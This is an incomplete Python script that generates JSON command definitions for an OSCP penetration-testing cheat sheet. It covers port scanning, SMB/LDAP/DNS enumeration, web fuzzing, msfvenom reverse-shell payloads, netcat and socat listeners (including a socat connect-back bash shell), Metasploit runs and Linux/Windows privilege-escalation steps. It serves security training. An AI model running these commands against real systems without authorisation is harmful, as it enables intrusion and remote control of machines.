#!/usr/bin/env python3
"""
Command Definition Generator

Generates JSON command definitions for:
1. Tool commands extracted from relations (497 candidates)
2. Missing OSCP essentials (123 gaps)

Output: JSON files in db/data/commands/ organized by category
"""

import json
from pathlib import Path
from typing import Dict, List, Any


# Command template with standard structure
def create_command_template(
    cmd_id: str,
    name: str,
    description: str,
    command: str,
    category: str,
    subcategory: str = "",
    variables: Dict[str, str] = None,
    flags: List[Dict[str, str]] = None,
    tags: List[str] = None,
    alternatives: List[str] = None,
    prerequisites: List[str] = None,
    next_steps: List[str] = None,
) -> Dict[str, Any]:
    """Create standardized command definition."""
    cmd_def = {
        "id": cmd_id,
        "name": name,
        "description": description,
        "command": command,
        "category": category,
    }

    if subcategory:
        cmd_def["subcategory"] = subcategory

    if variables:
        cmd_def["variables"] = variables

    if flags:
        cmd_def["flags"] = flags

    if tags:
        cmd_def["tags"] = tags
    else:
        cmd_def["tags"] = ["oscp", category.lower()]

    if alternatives:
        cmd_def["alternatives"] = alternatives

    if prerequisites:
        cmd_def["prerequisites"] = prerequisites

    if next_steps:
        cmd_def["next_steps"] = next_steps

    return cmd_def


# ==============================================================================
# RECONNAISSANCE & ENUMERATION COMMANDS
# ==============================================================================

RECON_COMMANDS = [
    create_command_template(
        cmd_id="rustscan-fast-scan",
        name="Rustscan - Fast Port Scanner",
        description="Ultra-fast SYN scanner that feeds open ports to nmap",
        command="rustscan -a <TARGET> -- -sV -sC",
        category="recon",
        subcategory="port-scanning",
        variables={
            "TARGET": {"description": "Target IP or hostname", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-a", "description": "Target address"},
            {"flag": "--", "description": "Pass flags to nmap"},
            {"flag": "-sV", "description": "Service version detection (nmap)"},
            {"flag": "-sC", "description": "Default scripts (nmap)"},
        ],
        tags=["oscp", "recon", "port-scan", "fast"],
        alternatives=["nmap-quick-scan", "masscan-fast-scan"],
        next_steps=["Enumerate discovered services", "Check for known vulnerabilities"],
    ),
    create_command_template(
        cmd_id="masscan-fast-scan",
        name="Masscan - Fast Network Scanner",
        description="Fastest internet-scale port scanner",
        command="masscan -p1-65535 <TARGET> --rate=1000",
        category="recon",
        subcategory="port-scanning",
        variables={
            "TARGET": {"description": "Target IP or CIDR range", "default": "192.168.1.0/24"}
        },
        flags=[
            {"flag": "-p", "description": "Port range to scan"},
            {"flag": "--rate", "description": "Packets per second"},
        ],
        tags=["oscp", "recon", "port-scan", "fast"],
        prerequisites=["sudo privileges for raw sockets"],
        next_steps=["nmap-service-scan"],
    ),
    create_command_template(
        cmd_id="autorecon-full",
        name="AutoRecon - Automated Enumeration",
        description="Multi-threaded network reconnaissance tool that automates enumeration",
        command="autorecon <TARGET> -o <OUTPUT_DIR>",
        category="recon",
        subcategory="automated",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "OUTPUT_DIR": {"description": "Output directory", "default": "./autorecon-results"}
        },
        flags=[
            {"flag": "-o", "description": "Output directory"},
            {"flag": "-v", "description": "Verbose output"},
        ],
        tags=["oscp", "recon", "automated", "enumeration"],
        next_steps=["Review scan results", "Prioritize attack vectors"],
    ),
    create_command_template(
        cmd_id="enum4linux-smb",
        name="Enum4Linux - SMB Enumeration",
        description="Tool for enumerating information from Windows and Samba systems",
        command="enum4linux -a <TARGET>",
        category="recon",
        subcategory="smb",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-a", "description": "Do all simple enumeration"},
            {"flag": "-U", "description": "Get userlist"},
            {"flag": "-S", "description": "Get sharelist"},
            {"flag": "-G", "description": "Get group and member list"},
        ],
        tags=["oscp", "smb", "enumeration", "windows"],
        alternatives=["enum4linux-ng", "crackmapexec smb <TARGET>"],
        next_steps=["Test null sessions", "Enumerate shares", "Check for vulnerabilities"],
    ),
    create_command_template(
        cmd_id="enum4linux-ng",
        name="Enum4Linux-ng - Modern SMB Enumeration",
        description="Next generation enum4linux with more features and better output",
        command="enum4linux-ng -A <TARGET>",
        category="recon",
        subcategory="smb",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-A", "description": "Do all enumeration"},
            {"flag": "-C", "description": "Get RPC info"},
            {"flag": "-U", "description": "Get users"},
            {"flag": "-S", "description": "Get shares"},
        ],
        tags=["oscp", "smb", "enumeration", "windows", "modern"],
        alternatives=["enum4linux-smb"],
        next_steps=["Mount accessible shares", "Test credentials"],
    ),
    create_command_template(
        cmd_id="whatweb-scan",
        name="WhatWeb - Web Technology Scanner",
        description="Identifies websites technologies, CMS, plugins, versions",
        command="whatweb -v <URL>",
        category="recon",
        subcategory="web",
        variables={
            "URL": {"description": "Target URL", "default": "http://target.com"}
        },
        flags=[
            {"flag": "-v", "description": "Verbose output"},
            {"flag": "-a", "description": "Aggression level (1-4)"},
        ],
        tags=["oscp", "web", "fingerprinting"],
        next_steps=["Research CMS vulnerabilities", "Check plugin versions"],
    ),
    create_command_template(
        cmd_id="ldapsearch-basic",
        name="LDAP Search - Basic Enumeration",
        description="Query LDAP directory for users and objects",
        command="ldapsearch -x -H ldap://<TARGET> -b '<BASE_DN>'",
        category="recon",
        subcategory="ldap",
        variables={
            "TARGET": {"description": "LDAP server IP", "default": "192.168.1.1"},
            "BASE_DN": {"description": "Base DN", "default": "DC=domain,DC=local"}
        },
        flags=[
            {"flag": "-x", "description": "Simple authentication"},
            {"flag": "-H", "description": "LDAP URI"},
            {"flag": "-b", "description": "Base DN for search"},
        ],
        tags=["oscp", "ldap", "active-directory", "enumeration"],
        next_steps=["Enumerate users", "Check for password policy"],
    ),
    create_command_template(
        cmd_id="ldapsearch-dump",
        name="LDAP Search - Full Dump",
        description="Dump all LDAP directory information",
        command="ldapsearch -x -H ldap://<TARGET> -b '<BASE_DN>' -D '<USER>' -w '<PASS>' '*'",
        category="recon",
        subcategory="ldap",
        variables={
            "TARGET": {"description": "LDAP server IP", "default": "192.168.1.1"},
            "BASE_DN": {"description": "Base DN", "default": "DC=domain,DC=local"},
            "USER": {"description": "Bind user", "default": ""},
            "PASS": {"description": "Password", "default": ""}
        },
        flags=[
            {"flag": "-D", "description": "Bind DN (user)"},
            {"flag": "-w", "description": "Password"},
            {"flag": "'*'", "description": "All attributes"},
        ],
        tags=["oscp", "ldap", "active-directory", "credential"],
        prerequisites=["Valid credentials"],
        next_steps=["Parse user data", "Extract service accounts"],
    ),
    create_command_template(
        cmd_id="dig-domain-enum",
        name="Dig - Domain Enumeration",
        description="DNS lookup utility for domain reconnaissance",
        command="dig <DOMAIN> ANY",
        category="recon",
        subcategory="dns",
        variables={
            "DOMAIN": {"description": "Target domain", "default": "example.com"}
        },
        tags=["oscp", "dns", "enumeration"],
        next_steps=["Try zone transfer", "Enumerate subdomains"],
    ),
    create_command_template(
        cmd_id="dig-zone-transfer",
        name="Dig - DNS Zone Transfer",
        description="Attempt AXFR zone transfer to dump all DNS records",
        command="dig axfr @<NAMESERVER> <DOMAIN>",
        category="recon",
        subcategory="dns",
        variables={
            "NAMESERVER": {"description": "DNS server IP", "default": "192.168.1.1"},
            "DOMAIN": {"description": "Target domain", "default": "example.com"}
        },
        flags=[
            {"flag": "axfr", "description": "Zone transfer request"},
            {"flag": "@", "description": "Specify nameserver"},
        ],
        tags=["oscp", "dns", "zone-transfer"],
        alternatives=["dnsrecon -t axfr -d <DOMAIN>"],
        next_steps=["Document all records", "Identify internal hostnames"],
    ),
    create_command_template(
        cmd_id="dnsenum-domain",
        name="DNSenum - Domain Enumeration",
        description="Comprehensive DNS enumeration tool",
        command="dnsenum <DOMAIN>",
        category="recon",
        subcategory="dns",
        variables={
            "DOMAIN": {"description": "Target domain", "default": "example.com"}
        },
        tags=["oscp", "dns", "enumeration"],
        next_steps=["Check for subdomains", "Try zone transfer"],
    ),
    create_command_template(
        cmd_id="dnsrecon-domain",
        name="DNSRecon - DNS Reconnaissance",
        description="DNS enumeration and network mapping",
        command="dnsrecon -d <DOMAIN> -t std",
        category="recon",
        subcategory="dns",
        variables={
            "DOMAIN": {"description": "Target domain", "default": "example.com"}
        },
        flags=[
            {"flag": "-d", "description": "Domain to target"},
            {"flag": "-t", "description": "Type of enumeration (std, axfr, bing, etc.)"},
        ],
        tags=["oscp", "dns", "enumeration"],
        alternatives=["dnsenum <DOMAIN>", "dig-zone-transfer"],
    ),
]


# ==============================================================================
# WEB APPLICATION TESTING COMMANDS
# ==============================================================================

WEB_COMMANDS = [
    create_command_template(
        cmd_id="ffuf-dir-fuzz",
        name="Ffuf - Directory Fuzzing",
        description="Fast web fuzzer for directory discovery",
        command="ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>",
        category="web",
        subcategory="fuzzing",
        variables={
            "TARGET": {"description": "Target IP/domain", "default": "192.168.1.1"},
            "WORDLIST": {"description": "Directory wordlist", "default": "/usr/share/wordlists/dirb/common.txt"}
        },
        flags=[
            {"flag": "-u", "description": "Target URL (FUZZ keyword for injection point)"},
            {"flag": "-w", "description": "Wordlist file"},
            {"flag": "-fc", "description": "Filter HTTP status codes"},
            {"flag": "-fs", "description": "Filter response size"},
        ],
        tags=["oscp", "web", "fuzzing", "directory"],
        alternatives=["gobuster-dir-basic", "wfuzz-dir"],
        next_steps=["Inspect discovered directories", "Check for upload functionality"],
    ),
    create_command_template(
        cmd_id="ffuf-vhost-fuzz",
        name="Ffuf - Virtual Host Discovery",
        description="Fuzz for virtual hosts on a target",
        command="ffuf -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>' -w <WORDLIST>",
        category="web",
        subcategory="fuzzing",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "DOMAIN": {"description": "Base domain", "default": "example.com"},
            "WORDLIST": {"description": "Subdomain wordlist", "default": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"}
        },
        flags=[
            {"flag": "-H", "description": "Custom header (Host header here)"},
            {"flag": "-fs", "description": "Filter by response size"},
        ],
        tags=["oscp", "web", "vhost", "fuzzing"],
        next_steps=["Add discovered vhosts to /etc/hosts", "Enumerate each vhost"],
    ),
    create_command_template(
        cmd_id="ffuf-param-fuzz",
        name="Ffuf - Parameter Fuzzing",
        description="Discover hidden GET/POST parameters",
        command="ffuf -u 'http://<TARGET>/<PATH>?FUZZ=test' -w <WORDLIST>",
        category="web",
        subcategory="fuzzing",
        variables={
            "TARGET": {"description": "Target domain", "default": "target.com"},
            "PATH": {"description": "Target path", "default": "index.php"},
            "WORDLIST": {"description": "Parameter wordlist", "default": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"}
        },
        flags=[
            {"flag": "-X", "description": "HTTP method (POST for POST params)"},
            {"flag": "-d", "description": "POST data (use with -X POST)"},
        ],
        tags=["oscp", "web", "parameters", "fuzzing"],
        next_steps=["Test discovered parameters for injection"],
    ),
    create_command_template(
        cmd_id="curl-get",
        name="Curl - HTTP GET Request",
        description="Make HTTP GET request to URL",
        command="curl <URL>",
        category="web",
        subcategory="http-client",
        variables={
            "URL": {"description": "Target URL", "default": "http://target.com"}
        },
        flags=[
            {"flag": "-v", "description": "Verbose output"},
            {"flag": "-i", "description": "Include response headers"},
            {"flag": "-L", "description": "Follow redirects"},
        ],
        tags=["oscp", "web", "http"],
        next_steps=["Inspect response", "Check headers"],
    ),
    create_command_template(
        cmd_id="curl-post",
        name="Curl - HTTP POST Request",
        description="Make HTTP POST request with data",
        command="curl -X POST -d '<DATA>' <URL>",
        category="web",
        subcategory="http-client",
        variables={
            "DATA": {"description": "POST data", "default": "param1=value1&param2=value2"},
            "URL": {"description": "Target URL", "default": "http://target.com/login"}
        },
        flags=[
            {"flag": "-X", "description": "HTTP method"},
            {"flag": "-d", "description": "POST data"},
            {"flag": "-H", "description": "Custom header"},
        ],
        tags=["oscp", "web", "http", "post"],
    ),
    create_command_template(
        cmd_id="curl-headers",
        name="Curl - View HTTP Headers",
        description="Display only HTTP response headers",
        command="curl -I <URL>",
        category="web",
        subcategory="http-client",
        variables={
            "URL": {"description": "Target URL", "default": "http://target.com"}
        },
        flags=[
            {"flag": "-I", "description": "Fetch headers only (HEAD request)"},
        ],
        tags=["oscp", "web", "http", "headers"],
        next_steps=["Check server version", "Look for security headers"],
    ),
]

# ==============================================================================
# EXPLOITATION TOOLS COMMANDS
# ==============================================================================

EXPLOIT_COMMANDS = [
    create_command_template(
        cmd_id="msfvenom-linux-shell",
        name="Msfvenom - Linux Reverse Shell",
        description="Generate Linux x64 reverse shell payload",
        command="msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf",
        category="exploitation",
        subcategory="payload-generation",
        variables={
            "LHOST": {"description": "Attacker IP", "default": "10.10.14.1"},
            "LPORT": {"description": "Listening port", "default": "4444"}
        },
        flags=[
            {"flag": "-p", "description": "Payload to generate"},
            {"flag": "LHOST", "description": "Local host (attacker IP)"},
            {"flag": "LPORT", "description": "Local port (listening port)"},
            {"flag": "-f", "description": "Output format (elf, exe, raw, etc.)"},
            {"flag": "-o", "description": "Output file"},
        ],
        tags=["oscp", "msfvenom", "payload", "linux", "reverse-shell"],
        prerequisites=["nc -lvnp <LPORT> (listener on attacker)"],
        next_steps=["Transfer payload to target", "chmod +x shell.elf", "Execute payload"],
    ),
    create_command_template(
        cmd_id="msfvenom-windows-shell",
        name="Msfvenom - Windows Reverse Shell",
        description="Generate Windows x64 reverse shell executable",
        command="msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe",
        category="exploitation",
        subcategory="payload-generation",
        variables={
            "LHOST": {"description": "Attacker IP", "default": "10.10.14.1"},
            "LPORT": {"description": "Listening port", "default": "4444"}
        },
        flags=[
            {"flag": "-p", "description": "Payload to generate"},
            {"flag": "-f", "description": "Output format (exe)"},
            {"flag": "-o", "description": "Output file"},
        ],
        tags=["oscp", "msfvenom", "payload", "windows", "reverse-shell"],
        prerequisites=["nc -lvnp <LPORT> (listener on attacker)"],
        next_steps=["Transfer to target", "Execute shell.exe"],
    ),
    create_command_template(
        cmd_id="msfvenom-staged",
        name="Msfvenom - Staged Payload",
        description="Generate staged payload for constrained environments",
        command="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o staged.elf",
        category="exploitation",
        subcategory="payload-generation",
        variables={
            "LHOST": {"description": "Attacker IP", "default": "10.10.14.1"},
            "LPORT": {"description": "Listening port", "default": "4444"}
        },
        flags=[
            {"flag": "-p", "description": "Staged payload (note the / instead of _)"},
            {"flag": "-e", "description": "Encoder (x86/shikata_ga_nai)"},
            {"flag": "-i", "description": "Encoding iterations"},
        ],
        tags=["oscp", "msfvenom", "payload", "staged", "meterpreter"],
        prerequisites=["msfconsole with handler"],
        next_steps=["Start Metasploit handler", "Execute payload on target"],
    ),
    create_command_template(
        cmd_id="searchsploit-search",
        name="Searchsploit - Search Exploits",
        description="Search exploit-db for vulnerabilities",
        command="searchsploit <SEARCH_TERM>",
        category="exploitation",
        subcategory="exploit-research",
        variables={
            "SEARCH_TERM": {"description": "Software name/version", "default": "apache 2.4"}
        },
        flags=[
            {"flag": "-t", "description": "Search exploit title"},
            {"flag": "-w", "description": "Show URLs"},
            {"flag": "-x", "description": "Examine exploit (searchsploit -x <EDB-ID>)"},
            {"flag": "-m", "description": "Mirror exploit to current directory"},
        ],
        tags=["oscp", "searchsploit", "exploit-db", "research"],
        next_steps=["Read exploit code", "Adapt for target", "Compile if needed"],
    ),
    create_command_template(
        cmd_id="searchsploit-update",
        name="Searchsploit - Update Database",
        description="Update local exploit-db repository",
        command="searchsploit -u",
        category="exploitation",
        subcategory="exploit-research",
        flags=[
            {"flag": "-u", "description": "Update exploit-db from GitHub"},
        ],
        tags=["oscp", "searchsploit", "update"],
        next_steps=["Search for exploits"],
    ),
    create_command_template(
        cmd_id="nc-listener",
        name="Netcat - Reverse Shell Listener",
        description="Start netcat listener for reverse shells",
        command="nc -lvnp <LPORT>",
        category="exploitation",
        subcategory="listeners",
        variables={
            "LPORT": {"description": "Local port to listen on", "default": "4444"}
        },
        flags=[
            {"flag": "-l", "description": "Listen mode"},
            {"flag": "-v", "description": "Verbose output"},
            {"flag": "-n", "description": "No DNS lookup"},
            {"flag": "-p", "description": "Port to listen on"},
        ],
        tags=["oscp", "netcat", "nc", "listener", "reverse-shell"],
        alternatives=["rlwrap nc -lvnp <LPORT> (for better shell interaction)"],
        next_steps=["Execute payload on target", "Upgrade shell (python pty)"],
    ),
    create_command_template(
        cmd_id="nc-bind-shell",
        name="Netcat - Bind Shell",
        description="Connect to bind shell on target",
        command="nc <TARGET> <RPORT>",
        category="exploitation",
        subcategory="shells",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "RPORT": {"description": "Remote port with bind shell", "default": "4444"}
        },
        tags=["oscp", "netcat", "nc", "bind-shell"],
        next_steps=["Upgrade shell", "Enumerate target"],
    ),
    create_command_template(
        cmd_id="socat-listener",
        name="Socat - Enhanced Listener",
        description="Start socat listener with PTY support",
        command="socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>",
        category="exploitation",
        subcategory="listeners",
        variables={
            "LPORT": {"description": "Listening port", "default": "4444"}
        },
        flags=[
            {"flag": "file:`tty`,raw,echo=0", "description": "PTY allocation for better shell"},
            {"flag": "tcp-listen", "description": "TCP listener"},
        ],
        tags=["oscp", "socat", "listener", "pty"],
        alternatives=["nc-listener"],
        prerequisites=["socat installed on attacker"],
        next_steps=["Connect with: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>"],
    ),
    create_command_template(
        cmd_id="socat-file-transfer",
        name="Socat - File Transfer",
        description="Transfer files using socat",
        command="socat TCP4-LISTEN:<LPORT>,fork file:<FILENAME>",
        category="exploitation",
        subcategory="file-transfer",
        variables={
            "LPORT": {"description": "Listening port", "default": "8000"},
            "FILENAME": {"description": "File to serve", "default": "exploit.sh"}
        },
        tags=["oscp", "socat", "file-transfer"],
        next_steps=["On target: socat TCP4:<LHOST>:<LPORT> file:<OUTFILE>,create"],
    ),
    create_command_template(
        cmd_id="msfconsole-search",
        name="Metasploit - Search Modules",
        description="Search for exploit modules in Metasploit",
        command="msfconsole -q -x 'search <SEARCH_TERM>; exit'",
        category="exploitation",
        subcategory="metasploit",
        variables={
            "SEARCH_TERM": {"description": "Search term", "default": "apache"}
        },
        flags=[
            {"flag": "-q", "description": "Quiet mode (no banner)"},
            {"flag": "-x", "description": "Execute command and exit"},
        ],
        tags=["oscp", "metasploit", "msfconsole", "search"],
        next_steps=["Review module info", "Configure and run exploit"],
    ),
    create_command_template(
        cmd_id="msfconsole-exploit",
        name="Metasploit - Run Exploit",
        description="Execute exploit module with handler",
        command="msfconsole -q -x 'use <MODULE>; set RHOSTS <TARGET>; set LHOST <LHOST>; run'",
        category="exploitation",
        subcategory="metasploit",
        variables={
            "MODULE": {"description": "Exploit module path", "default": "exploit/multi/handler"},
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "LHOST": {"description": "Attacker IP", "default": "10.10.14.1"}
        },
        tags=["oscp", "metasploit", "msfconsole", "exploit"],
        next_steps=["Verify shell access", "Post-exploitation"],
    ),
]


# ==============================================================================
# POST-EXPLOITATION COMMANDS
# ==============================================================================

POST_EXPLOIT_COMMANDS = [
    create_command_template(
        cmd_id="linpeas-run",
        name="LinPEAS - Linux Privilege Escalation",
        description="Automated Linux privilege escalation enumeration",
        command="./linpeas.sh",
        category="post-exploitation",
        subcategory="enumeration-linux",
        tags=["oscp", "linpeas", "linux", "privesc", "enumeration"],
        prerequisites=["Transfer linpeas.sh to target", "chmod +x linpeas.sh"],
        next_steps=["Review color-coded output", "Focus on RED/YELLOW findings", "Test exploits"],
    ),
    create_command_template(
        cmd_id="linenum-run",
        name="LinEnum - Linux Enumeration",
        description="Linux enumeration script for privilege escalation",
        command="./LinEnum.sh -t",
        category="post-exploitation",
        subcategory="enumeration-linux",
        flags=[
            {"flag": "-t", "description": "Thorough tests (longer runtime)"},
            {"flag": "-k", "description": "Kernel exploits"},
            {"flag": "-r", "description": "Report name"},
        ],
        tags=["oscp", "linenum", "linux", "privesc", "enumeration"],
        prerequisites=["Transfer LinEnum.sh", "chmod +x"],
        next_steps=["Check SUID binaries", "Review cronjobs", "Test sudo"],
    ),
    create_command_template(
        cmd_id="les-run",
        name="Linux Exploit Suggester",
        description="Suggest kernel exploits for privilege escalation",
        command="./linux-exploit-suggester.sh",
        category="post-exploitation",
        subcategory="enumeration-linux",
        tags=["oscp", "linux-exploit-suggester", "kernel", "privesc"],
        prerequisites=["Transfer script", "chmod +x"],
        next_steps=["Download suggested exploits", "Compile on target", "Test carefully"],
    ),
    create_command_template(
        cmd_id="pspy-monitor",
        name="Pspy - Process Monitor",
        description="Monitor Linux processes without root (detect cronjobs)",
        command="./pspy64",
        category="post-exploitation",
        subcategory="enumeration-linux",
        tags=["oscp", "pspy", "processes", "cronjobs", "monitoring"],
        prerequisites=["Transfer pspy64/pspy32", "chmod +x"],
        next_steps=["Watch for cronjobs", "Identify writable scripts", "Path hijacking"],
    ),
    create_command_template(
        cmd_id="winpeas-run",
        name="WinPEAS - Windows Privilege Escalation",
        description="Automated Windows privilege escalation enumeration",
        command="winpeas.exe",
        category="post-exploitation",
        subcategory="enumeration-windows",
        tags=["oscp", "winpeas", "windows", "privesc", "enumeration"],
        prerequisites=["Transfer winpeas.exe to target"],
        next_steps=["Review output", "Check unquoted service paths", "Test exploits"],
    ),
    create_command_template(
        cmd_id="wes-run",
        name="Windows Exploit Suggester",
        description="Suggest Windows exploits based on systeminfo",
        command="python windows-exploit-suggester.py --database <DB> --systeminfo <FILE>",
        category="post-exploitation",
        subcategory="enumeration-windows",
        variables={
            "DB": {"description": "Exploit database file", "default": "2024-01-01-mssb.xls"},
            "FILE": {"description": "systeminfo.txt from target", "default": "systeminfo.txt"}
        },
        flags=[
            {"flag": "--update", "description": "Update exploit database"},
            {"flag": "--database", "description": "Path to database file"},
            {"flag": "--systeminfo", "description": "systeminfo output file"},
        ],
        tags=["oscp", "windows-exploit-suggester", "windows", "privesc"],
        prerequisites=["Run 'systeminfo > systeminfo.txt' on target", "Update database first"],
        next_steps=["Download suggested exploits", "Compile if needed", "Execute on target"],
    ),
    create_command_template(
        cmd_id="powerup-run",
        name="PowerUp - Windows Privesc Check",
        description="PowerShell script for Windows privilege escalation checks",
        command="powershell -ep bypass -c '. .\\PowerUp.ps1; Invoke-AllChecks'",
        category="post-exploitation",
        subcategory="enumeration-windows",
        flags=[
            {"flag": "-ep bypass", "description": "Bypass execution policy"},
            {"flag": "-c", "description": "Command to execute"},
        ],
        tags=["oscp", "powerup", "powershell", "windows", "privesc"],
        prerequisites=["Transfer PowerUp.ps1"],
        next_steps=["Check service misconfigurations", "Test unquoted paths", "DLL hijacking"],
    ),
    create_command_template(
        cmd_id="privesccheck-run",
        name="PrivescCheck - Windows Enumeration",
        description="Comprehensive Windows privilege escalation checks",
        command="powershell -ep bypass -c '. .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended'",
        category="post-exploitation",
        subcategory="enumeration-windows",
        flags=[
            {"flag": "-Extended", "description": "Extended checks (slower)"},
            {"flag": "-Report", "description": "Output format (HTML, CSV, TXT)"},
        ],
        tags=["oscp", "privesccheck", "powershell", "windows", "privesc"],
        prerequisites=["Transfer PrivescCheck.ps1"],
        next_steps=["Review findings", "Test vulnerabilities"],
    ),
    create_command_template(
        cmd_id="seatbelt-run",
        name="Seatbelt - Windows Host Survey",
        description="C# tool for Windows security posture assessment",
        command="Seatbelt.exe -group=all",
        category="post-exploitation",
        subcategory="enumeration-windows",
        flags=[
            {"flag": "-group=all", "description": "Run all checks"},
            {"flag": "-group=system", "description": "System checks only"},
            {"flag": "-group=user", "description": "User checks only"},
        ],
        tags=["oscp", "seatbelt", "windows", "enumeration", "c-sharp"],
        prerequisites=["Transfer Seatbelt.exe"],
        next_steps=["Review credentials", "Check AppLocker", "Enumerate services"],
    ),
    create_command_template(
        cmd_id="sharphound-collect",
        name="SharpHound - AD Data Collection",
        description="Collect Active Directory data for BloodHound analysis",
        command="SharpHound.exe -c All",
        category="post-exploitation",
        subcategory="active-directory",
        flags=[
            {"flag": "-c", "description": "Collection method (All, DCOnly, ComputerOnly)"},
            {"flag": "--domain", "description": "Target domain"},
            {"flag": "--zipfilename", "description": "Output file name"},
        ],
        tags=["oscp", "sharphound", "bloodhound", "active-directory", "enumeration"],
        prerequisites=["Domain user access"],
        next_steps=["Transfer zip to attacker", "Import to BloodHound", "Analyze paths"],
    ),
    create_command_template(
        cmd_id="bloodhound-analyze",
        name="BloodHound - AD Path Analysis",
        description="Analyze Active Directory attack paths",
        command="neo4j console",
        category="post-exploitation",
        subcategory="active-directory",
        tags=["oscp", "bloodhound", "active-directory", "analysis"],
        prerequisites=["Import SharpHound data", "Neo4j running"],
        next_steps=["Find shortest path to DA", "Check for AS-REP roasting", "Kerberoasting"],
    ),
]


# ==============================================================================
# PRIVILEGE ESCALATION COMMANDS
# ==============================================================================

PRIVESC_COMMANDS = [
    create_command_template(
        cmd_id="sudo-check",
        name="Sudo - Check Permissions",
        description="List commands current user can run with sudo",
        command="sudo -l",
        category="privilege-escalation",
        subcategory="linux",
        flags=[
            {"flag": "-l", "description": "List user's sudo privileges"},
            {"flag": "-U", "description": "List privileges for another user"},
        ],
        tags=["oscp", "sudo", "linux", "privesc"],
        next_steps=["Check GTFOBins for command", "Test sudo exploit"],
    ),
    create_command_template(
        cmd_id="sudo-exploit",
        name="Sudo - Exploit Misconfiguration",
        description="Exploit sudo command to escalate privileges",
        command="sudo <COMMAND>",
        category="privilege-escalation",
        subcategory="linux",
        variables={
            "COMMAND": {"description": "Command from sudo -l", "default": "/usr/bin/vim"}
        },
        tags=["oscp", "sudo", "linux", "privesc", "gtfobins"],
        prerequisites=["sudo -l shows exploitable command", "GTFOBins entry exists"],
        next_steps=["Follow GTFOBins instructions", "Get root shell"],
    ),
    create_command_template(
        cmd_id="suid-find",
        name="SUID - Find Binaries",
        description="Find SUID/SGID binaries for privilege escalation",
        command="find / -perm -u=s -type f 2>/dev/null",
        category="privilege-escalation",
        subcategory="linux",
        flags=[
            {"flag": "-perm -u=s", "description": "Find SUID bit set"},
            {"flag": "-type f", "description": "Files only"},
            {"flag": "2>/dev/null", "description": "Suppress errors"},
        ],
        tags=["oscp", "suid", "linux", "privesc", "find"],
        alternatives=["find / -perm -4000 2>/dev/null (octal notation)"],
        next_steps=["Check unusual binaries", "Search GTFOBins", "Test exploits"],
    ),
    create_command_template(
        cmd_id="suid-exploit",
        name="SUID - Exploit Binary",
        description="Exploit SUID binary for privilege escalation",
        command="<SUID_BINARY>",
        category="privilege-escalation",
        subcategory="linux",
        variables={
            "SUID_BINARY": {"description": "SUID binary to exploit", "default": "/usr/bin/find"}
        },
        tags=["oscp", "suid", "linux", "privesc", "gtfobins"],
        prerequisites=["SUID binary identified", "GTFOBins entry exists"],
        next_steps=["Execute exploitation steps", "Verify root access"],
    ),
    create_command_template(
        cmd_id="cap-find",
        name="Capabilities - Find Binaries",
        description="Find binaries with Linux capabilities",
        command="getcap -r / 2>/dev/null",
        category="privilege-escalation",
        subcategory="linux",
        flags=[
            {"flag": "-r", "description": "Recursive search"},
            {"flag": "2>/dev/null", "description": "Suppress errors"},
        ],
        tags=["oscp", "capabilities", "linux", "privesc"],
        next_steps=["Check for cap_setuid", "Search GTFOBins", "Test exploits"],
    ),
    create_command_template(
        cmd_id="cap-exploit",
        name="Capabilities - Exploit Binary",
        description="Exploit capability-enabled binary for privesc",
        command="<CAP_BINARY>",
        category="privilege-escalation",
        subcategory="linux",
        variables={
            "CAP_BINARY": {"description": "Capability binary", "default": "/usr/bin/python3.8"}
        },
        tags=["oscp", "capabilities", "linux", "privesc", "gtfobins"],
        prerequisites=["Binary with cap_setuid+ep found"],
        next_steps=["Use capability to escalate", "Get root shell"],
    ),
    create_command_template(
        cmd_id="cron-enum",
        name="Cronjobs - Enumerate",
        description="Find scheduled cronjobs for privilege escalation",
        command="cat /etc/crontab",
        category="privilege-escalation",
        subcategory="linux",
        tags=["oscp", "cronjobs", "linux", "privesc", "enumeration"],
        alternatives=[
            "ls -la /etc/cron.* (check cron directories)",
            "pspy64 (monitor without root)",
            "grep -r CRON /var/log/ (check logs)"
        ],
        next_steps=["Check script permissions", "Test path hijacking", "Monitor with pspy"],
    ),
    create_command_template(
        cmd_id="kernel-exploit-search",
        name="Kernel Exploit - Search",
        description="Search for kernel exploits",
        command="uname -a",
        category="privilege-escalation",
        subcategory="linux",
        flags=[
            {"flag": "-a", "description": "All system information"},
        ],
        tags=["oscp", "kernel", "linux", "privesc"],
        next_steps=["Run linux-exploit-suggester", "Search exploit-db", "Compile exploit"],
    ),
    create_command_template(
        cmd_id="gtfobins-lookup",
        name="GTFOBins - Lookup",
        description="Lookup binary exploitation on GTFOBins",
        command="# Visit https://gtfobins.github.io/",
        category="privilege-escalation",
        subcategory="linux",
        tags=["oscp", "gtfobins", "linux", "privesc", "reference"],
        next_steps=["Search for binary", "Follow exploitation steps", "Test on target"],
    ),
    create_command_template(
        cmd_id="lolbas-lookup",
        name="LOLBAS - Lookup",
        description="Lookup Windows binary exploitation on LOLBAS",
        command="# Visit https://lolbas-project.github.io/",
        category="privilege-escalation",
        subcategory="windows",
        tags=["oscp", "lolbas", "windows", "privesc", "reference"],
        next_steps=["Search for binary", "Follow exploitation steps", "Test on target"],
    ),
]


# ==============================================================================
# PASSWORD ATTACK COMMANDS
# ==============================================================================

PASSWORD_COMMANDS = [
    create_command_template(
        cmd_id="hydra-ftp",
        name="Hydra - FTP Brute Force",
